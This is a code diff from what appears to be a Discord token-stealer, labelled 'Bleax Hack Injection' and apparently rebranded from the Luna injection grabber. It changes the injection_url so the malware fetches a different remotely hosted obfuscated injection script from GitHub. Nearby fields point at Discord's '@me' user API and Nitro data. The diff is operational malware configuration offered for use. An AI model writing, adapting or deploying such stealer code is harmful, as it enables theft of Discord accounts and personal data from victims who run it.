@@ -14,7 +14,7 @@ const config = {
   embed_name: 'Bleax Hack Injection',
   embed_icon: 'https://cdn.discordapp.com/avatars/499553285825363969/96e263e29fd082fc6d0a575b406d17ef.webp?size=4096'.replace(/ /g, '%20'),
   embed_color: 5639644, 
-  injection_url: 'https://raw.githubusercontent.com/Smug246/luna-injection/main/obfuscated-injection.js', 
+  injection_url: 'https://raw.githubusercontent.com/Bleax-D-Hack/Bleax-Injection/main/obfuscated-injection.js', 
 
   api: 'https://discord.com/api/v9/users/@me',
   nitro: {
